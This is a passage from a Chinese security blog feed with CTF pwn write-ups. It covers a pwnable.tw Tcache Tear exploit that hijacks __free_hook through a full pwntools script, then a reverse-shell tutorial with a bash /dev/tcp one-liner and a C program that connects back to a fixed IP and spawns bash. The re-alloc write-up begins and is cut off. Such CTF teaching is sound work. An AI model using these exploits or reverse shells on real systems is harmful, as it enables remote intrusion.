0x3ebca0</p><h3 id="控制流劫持"><a href="#控制流劫持" class="headerlink" title="控制流劫持"></a>控制流劫持</h3><p>libc中有很多可以利用的函数指针，在堆的题目中常用的函数是<strong>__free_hook</strong>和<strong>__malloc_hook</strong></p><p>hook 即 钩子</p><h4 id="libc中的钩子函数"><a href="#libc中的钩子函数" class="headerlink" title="libc中的钩子函数"></a>libc中的钩子函数</h4><p>在malloc和free的函数的开始部分，都会去判断是否有相应的钩子函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wapper for int_malloc</span></span><br><span class="line"><span class="keyword">void</span> *__libc_malloc(<span class="keyword">size_t</span> bytes) &#123;</span><br><span class="line">    mstate ar_ptr;</span><br><span class="line">    <span class="keyword">void</span> * victim;</span><br><span class="line">    <span class="comment">// 检查是否有内存分配钩子，如果有，调用钩子并返回.</span></span><br><span class="line">    <span class="keyword">void</span> *(*hook)(<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *) = atomic_forced_read(__malloc_hook);</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">        <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS(<span class="number">0</span>));</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// wapper for int_free</span></span><br><span class="line"><span class="keyword">void</span> __libc_free(<span class="keyword">void</span> *mem) &#123;</span><br><span class="line">    mstate    ar_ptr;</span><br><span class="line">    mchunkptr p; <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line">    <span class="comment">// 判断是否有钩子函数 __free_hook</span></span><br><span class="line">    <span class="keyword">void</span> (*hook)(<span class="keyword">void</span> *, <span class="keyword">const</span> <span class="keyword">void</span> *) = atomic_forced_read(__free_hook);</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(hook != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">        (*hook)(mem, RETURN_ADDRESS(<span class="number">0</span>));</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序先把全局变量__free_hook赋给了局部变量hook，然后对hook是否为NULL进行判断，如果不为空，则执行hook。</p><p>一般的情况下__free_hook是为NULL的，所以是不会执行的，但是如果有人恶意修改__free_hook的话，就会造成__free_hook劫持。</p><p>这是用来方便用户自定义自己的malloc和free函数，用法参考：<a href="https://www.jianshu.com/p/0d7aa3166eec" target="_blank" rel="noopener">malloc hook初探</a>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> (*__malloc_initialize_hook) (<span class="keyword">void</span>) = my_init_hook;</span><br><span class="line">__malloc_hook = my_malloc_hook;</span><br><span class="line">__free_hook = my_free_hook;</span><br></pre></td></tr></table></figure><p>直接利用这种赋值语句，就可以直接给libc中的对应变量赋值，因为这几个符号都是libc所导出的。</p><p>那么同理，其他的hook函数也可能被我们所利用（狗头</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ strings libc-tcache.so | grep hook</span><br><span class="line">__malloc_initialize_hook</span><br><span class="line">_dl_open_hook</span><br><span class="line">argp_program_version_hook</span><br><span class="line">__after_morecore_hook</span><br><span class="line">__memalign_hook</span><br><span class="line">__malloc_hook</span><br><span class="line">__free_hook</span><br><span class="line">_dl_open_hook2</span><br><span class="line">__realloc_hook</span><br></pre></td></tr></table></figure><h4 id="利用-free-hook"><a href="#利用-free-hook" class="headerlink" title="利用__free_hook"></a>利用__free_hook</h4><p>本题我们利用__free_hook来完成控制流劫持，因为我们可以执行free函数，即可以触发到相应的函数指针，并且方便控制参数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v4 &lt;= <span class="number">7</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br><span class="line">  ++v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ptr参数可以通过malloc直接控制，所以接下来有两种方法：</p><ol><li>直接劫持__free_hook到one_gadget</li><li>劫持__free_hook到system函数，并再次malloc控制ptr指向<code>/bin/sh</code>等字符串</li></ol><p>找到以下one_gadget地址，测试第二个可用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ one_gadget libc-tcache.so </span><br><span class="line">0x4f2c5 execve(&quot;&#x2F;bin&#x2F;sh&quot;, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rsp &amp; 0xf &#x3D;&#x3D; 0</span><br><span class="line">  rcx &#x3D;&#x3D; NULL</span><br><span class="line"></span><br><span class="line">0x4f322 execve(&quot;&#x2F;bin&#x2F;sh&quot;, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x40] &#x3D;&#x3D; NULL</span><br><span class="line"></span><br><span class="line">0x10a38c execve(&quot;&#x2F;bin&#x2F;sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] &#x3D;&#x3D; NULL</span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>原来system($0)也能获取shell，又学到一手</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys, time</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">elf = ELF(<span class="string">"./tcache_tear"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-tcache.so"</span>)</span><br><span class="line">io = process(elf.path)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">elf = ELF(<span class="string">"./tcache_tear"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-tcache.so"</span>)</span><br><span class="line">io = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10207</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">################################################</span></span><br><span class="line">s = io.send                                    <span class="comment">#</span></span><br><span class="line">sl = io.sendline                               <span class="comment">#</span></span><br><span class="line">sa = io.sendafter                              <span class="comment">#</span></span><br><span class="line">sla = io.sendlineafter                         <span class="comment">#</span></span><br><span class="line">r = io.recv                                    <span class="comment">#</span></span><br><span class="line">rl = io.recvline                               <span class="comment">#</span></span><br><span class="line">ru = io.recvuntil                              <span class="comment">#</span></span><br><span class="line">it = io.interactive                            <span class="comment">#</span></span><br><span class="line"><span class="comment">################################################</span></span><br><span class="line"></span><br><span class="line">init = <span class="keyword">lambda</span> name : sla(<span class="string">"Name:"</span>,name)</span><br><span class="line">malloc = <span class="keyword">lambda</span> size,data : (sla(<span class="string">"choice :"</span>,<span class="string">"1"</span>),sla(<span class="string">"Size:"</span>, str(size)),sla(<span class="string">"Data:"</span>,data))</span><br><span class="line">free = <span class="keyword">lambda</span> : sla(<span class="string">"choice :"</span>,<span class="string">"2"</span>)</span><br><span class="line">info = <span class="keyword">lambda</span> : sla(<span class="string">"choice :"</span>,<span class="string">"3"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aaw</span><span class="params">(len,addr,data)</span>:</span></span><br><span class="line">    malloc(len,<span class="string">"aaa"</span>)</span><br><span class="line">    free()</span><br><span class="line">    free()</span><br><span class="line">    malloc(len,p64(addr))</span><br><span class="line">    malloc(len,<span class="string">"aaa"</span>)</span><br><span class="line">    malloc(len,data)</span><br><span class="line">    </span><br><span class="line">name_bss = <span class="number">0x602060</span></span><br><span class="line"></span><br><span class="line">init(p64(<span class="number">0</span>)+p64(<span class="number">0x501</span>))</span><br><span class="line">aaw(<span class="number">0x50</span>,name_bss+<span class="number">0x500</span>,(p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>)*<span class="number">2</span>)</span><br><span class="line">aaw(<span class="number">0x60</span>,name_bss+<span class="number">0x10</span>,<span class="string">'a'</span>)</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line">info()</span><br><span class="line">io.recvuntil(<span class="string">"Name :"</span>); io.recv(<span class="number">0x10</span>)</span><br><span class="line">libc_addr = u64(io.recv(<span class="number">8</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line">free_hook = libc_addr + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">system    = libc_addr + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">aaw(<span class="number">0x70</span>,free_hook,p64(system))</span><br><span class="line">malloc(<span class="number">0x80</span>,<span class="string">"$0\x00"</span>)</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>参考：</p><ul><li><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/03/13/tcache/" target="_blank" rel="noopener">和媳妇一起学Pwn 之 Tcache Tear</a></li><li><a href="http://blog.eonew.cn/archives/521" target="_blank" rel="noopener">__free_hook 劫持原理</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> pwnable.tw </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何构建一个反弹shell</title>
      <link href="2020/11/22/%E5%A6%82%E4%BD%95%E6%9E%84%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%8F%8D%E5%BC%B9shell/"/>
      <url>2020/11/22/%E5%A6%82%E4%BD%95%E6%9E%84%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%8F%8D%E5%BC%B9shell/</url>
      
        <content type="html"><![CDATA[<p>所谓反弹shell，就是我们在自己的机器上开启监听，然后在被攻击者的机器上发送连接请求去连接我们的机器，将攻击者的shell反弹到我们的机器上</p><h2 id="linux命令行"><a href="#linux命令行" class="headerlink" title="linux命令行"></a>linux命令行</h2><p>在linux命令行上很简单实现，我们只需要准备两个可以互相通信的虚拟机</p><p>在第一台上面监听7777端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nc -lvp 7777</span><br></pre></td></tr></table></figure><p>在第二台上输入以下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;172.16.119.170&#x2F;7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>bash -i 的意思是在本地打开一个bash，&gt;&amp;是linux中的重定位，而/dev/tcp是一个很特殊的文件，打开这个文件就相当于发出了一个socket调用，建立一个socket连接，&gt;&amp;后面跟上这个文件代表将标准输出和标准错误输出重定向到这个文件，也就是传递到远程上，如果远程开启了对应的端口去监听，就会接收到这个bash的标准输出和标准错误输出，这个时候我们在第一台机器上输入命令，输出以及错误输出的内容就会被传递显示到远程。</p><h2 id="c语言实现"><a href="#c语言实现" class="headerlink" title="c语言实现"></a>c语言实现</h2><p>其实c语言的实现就是把上面的过程用c语言执行了一遍，代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> tcp_port = <span class="number">7777</span>;</span><br><span class="line"><span class="keyword">char</span> *ip = <span class="string">"172.16.119.170"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> fd;</span><br><span class="line">        <span class="keyword">if</span> ( fork() &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></span><br><span class="line">                addr.sin_family = AF_INET;</span><br><span class="line">                addr.sin_port = htons(tcp_port);</span><br><span class="line">                addr.sin_addr.s_addr = inet_addr(ip);</span><br><span class="line"></span><br><span class="line">                fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">                <span class="keyword">if</span> ( <span class="built_in">connect</span>(fd, (struct sockaddr*)&amp;addr, <span class="keyword">sizeof</span>(addr)) )&#123;</span><br><span class="line">                        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                dup2(fd, <span class="number">0</span>);</span><br><span class="line">                dup2(fd, <span class="number">1</span>);</span><br><span class="line">                dup2(fd, <span class="number">2</span>);</span><br><span class="line">                execve(<span class="string">"/bin/bash"</span>, <span class="number">0L</span>L, <span class="number">0L</span>L);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>dup2()函数作用就是上文中的文件重定位&gt;&amp;，这样说可能不太好，因为准确的说在shell的重定向功能中，输入重定向和输出重定向就是通过调用dup()和dup2()来实现的，不能说父亲长得像儿子。</p><p>connect函数原型为int connect (int sockfd,struct sockaddr * serv_addr,int addrlen);，成功返回0。</p><p>我们在第一台机器上对7777端口监听后，第二台机器上编译运行即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -o test test.c</span><br><span class="line">$ .&#x2F;test</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.tw-re-alloc-利用realloc实现uaf更改got表</title>
      <link href="2020/11/21/pwnable-tw-re-alloc-%E5%88%A9%E7%94%A8realloc%E5%AE%9E%E7%8E%B0uaf%E6%9B%B4%E6%94%B9got%E8%A1%A8/"/>
      <url>2020/11/21/pwnable-tw-re-alloc-%E5%88%A9%E7%94%A8realloc%E5%AE%9E%E7%8E%B0uaf%E6%9B%B4%E6%94%B9got%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ file re-alloc </span><br><span class="line">re-alloc: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;l, BuildID[sha1]&#x3D;14ee078dfdcc34a92545f829c718d7acb853945b, for GNU&#x2F;Linux 3.2.0, not stripped</span><br><span class="line">$ checksec re-alloc </span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>Partial RELRO 意味着got表可改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ strings libc-realloc.so | grep glibc</span><br><span class="line">glibc 2.29</span><br></pre></td></tr></table></figure><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="realloc函数"><a href="#realloc函数" class="headerlink" title="realloc函数"></a>realloc函数</h3><p>函数原型：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">realloc</span><span class="params">(<span class="keyword">void</span> *ptr, <span class="keyword">size_t</span> <span class="built_in">size</span>)</span></span>;</span><br></pre></td></tr></table></figure><p>在参数 ptr 、size 的各种取值情况下，等效于：</p><ol><li><code>ptr == 0</code>: malloc(size)</li><li><code>ptr != 0 &amp;&amp; size == 0</code>: free(ptr)</li><li><code>ptr != 0 &amp;&amp; size != old_size</code>: 释放之前的块再重新分配一个（保存数据）</li></ol><h3 id="libc-2-29-对-tcache-新增的检查"><a href="#libc-2-29-对-tcache-新增的检查" class="headerlink" title="libc 2.29 对 tcache 新增的检查"></a>libc 2.29 对 tcache 新增的检查</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// glibc-2.29</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* This test succeeds on double free.  However, we don't 100%</span></span><br><span class="line"><span class="comment">    trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">    2^&lt;size_t&gt; chance), so verify it's not an unlikely</span></span><br><span class="line"><span class="comment">    coincidence before aborting.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">  &#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">    tmp;</span><br><span class="line">    tmp = tmp-&gt;next)</span><br><span class="line">      <span class="keyword">if</span> (tmp == e)</span><br><span class="line">  malloc_printerr (<span class="string">"free(): double free detected in tcache 2"</span>);</span><br><span class="line">    <span class="comment">/* If we get here, it was a coincidence.  We've wasted a</span></span><br><span class="line"><span class="comment">        few cycles, but don't abort.  */</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>主要检查为，当一个chunk 被 free 到 tcache 中时，其 fd 的下一个字长不再空余，而是被置为 key ，存放保存 tcache 结构体的 chunk 的地址，这里会对<code>tcache</code>链表上的所有chunk进行对比，检测是否有重复。</p><p>绕过此检查的方法例如借助 UAF 等漏洞，将 tcache chunk 的 key 覆盖成不为存放 tcache 的内存地址即可。</p><h2 id="配置题目运行环境"><a href="#配置题目运行环境" class="headerlink" title="配置题目运行环境"></a>配置题目运行环境</h2><h3 id="glibc-all-in-one"><a href="#glibc-all-in-one" class="headerlink" title="glibc-all-in-one"></a>glibc-all-in-one</h3><p><a href="https://github.com/matrix1001/glibc-all-in-one" target="_blank" rel="noopener">https://github.com/matrix1001/glibc-all-in-one</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https:&#x2F;&#x2F;github.com&#x2F;matrix1001&#x2F;glibc-all-in-one.git</span><br><span class="line">$ cd glibc-all-in-one&#x2F;</span><br><span class="line">$ chmod a+x build download extract</span><br><span class="line">$ .&#x2F;update_list</span><br></pre></td></tr></table></figure><h4 id="查看list文件"><a href="#查看list文件" class="headerlink" title="查看list文件"></a>查看list文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat list</span><br><span class="line">$ cat old_list</span><br></pre></td></tr></table></figure><h4 id="下载glibc"><a href="#下载glibc" class="headerlink" title="下载glibc"></a>下载glibc</h4><p>例如需要下载2.29-0ubuntu2_amd64</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ .&#x2F;download_old 2.29-0ubuntu2_amd64</span><br><span class="line">Getting 2.29-0ubuntu2_amd64</span><br><span class="line">  -&gt; Location: http:&#x2F;&#x2F;old-releases.ubuntu.com&#x2F;ubuntu&#x2F;pool&#x2F;main&#x2F;g&#x2F;glibc&#x2F;libc6_2.29-0ubuntu2_amd64.deb</span><br><span class="line">  -&gt; Downloading libc binary package</span><br><span class="line">  -&gt; Extracting libc binary package</span><br><span class="line">  -&gt; Package saved to libs&#x2F;2.29-0ubuntu2_amd64</span><br><span class="line">  -&gt; Location: http:&#x2F;&#x2F;old-releases.ubuntu.com&#x2F;ubuntu&#x2F;pool&#x2F;main&#x2F;g&#x2F;glibc&#x2F;libc6-dbg_2.29-0ubuntu2_amd64.deb</span><br><span class="line">  -&gt; Downloading libc debug package</span><br><span class="line">  -&gt; Extracting libc debug package</span><br><span class="line">  -&gt; Package saved to libs&#x2F;2.29-0ubuntu2_amd64&#x2F;.debug</span><br><span class="line">$ ls libs&#x2F;2.29-0ubuntu2_amd64&#x2F;</span><br><span class="line">ld-2.29.so ... libc-2.29.so</span><br></pre></td></tr></table></figure><h3 id="patchelf"><a href="#patchelf" class="headerlink" title="patchelf"></a>patchelf</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install patchelf</span><br></pre></td></tr></table></figure><p>例如我们需要让 re-alloc 程序指向glibc-all-in-one中下载的libc-2.29</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ ldd re-alloc </span><br><span class="line">linux-vdso.so.1 &#x3D;&gt;  (0x00007ffd3e7c7000)</span><br><span class="line">libc.so.6 &#x3D;&gt; &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6 (0x00007f48a66cb000)</span><br><span class="line">&#x2F;lib64&#x2F;ld-linux-x86-64.so.2 (0x00007f48a6a95000)</span><br><span class="line">$ patchelf  --set-rpath ~&#x2F;Desktop&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.29-0ubuntu2_amd64&#x2F; re-alloc</span><br><span class="line">$ patchelf --set-interpreter ~&#x2F;Desktop&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.29-0ubuntu2_amd64&#x2F;ld-2.29.so re-alloc</span><br><span class="line">$ ldd re-alloc </span><br><span class="line">linux-vdso.so.1 &#x3D;&gt;  (0x00007ffdaff7e000)</span><br><span class="line">libc.so.6 &#x3D;&gt; &#x2F;home&#x2F;ctfer&#x2F;Desktop&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.29-0ubuntu2_amd64&#x2F;libc.so.6 (0x00007f2d342fd000)</span><br><span class="line">&#x2F;home&#x2F;ctfer&#x2F;Desktop&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.29-0ubuntu2_amd64&#x2F;ld-2.29.so &#x3D;&gt; &#x2F;lib64&#x2F;ld-linux-x86-64.so.2 (0x00007f2d342c4000)</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>运行程序，是一个经典的菜单题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ .&#x2F;re-alloc </span><br><span class="line">$$$$$$$$$$$$$$$$$$$$$$$$$$$$</span><br><span class="line">🍊      RE Allocator      🍊</span><br><span class="line">$$$$$$$$$$$$$$$$$$$$$$$$$$$$</span><br><span class="line">$   1. Alloc               $</span><br><span class="line">$   2. Realloc             $</span><br><span class="line">$   3. Free                $</span><br><span class="line">$   4. Exit                $</span><br><span class="line">$$$$$$$$$$$$$$$$$$$$$$$$$$$</span><br><span class="line">Your choice:</span><br></pre></td></tr></table></figure><h3 id="alloc"><a href="#alloc" class="headerlink" title="alloc"></a>alloc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 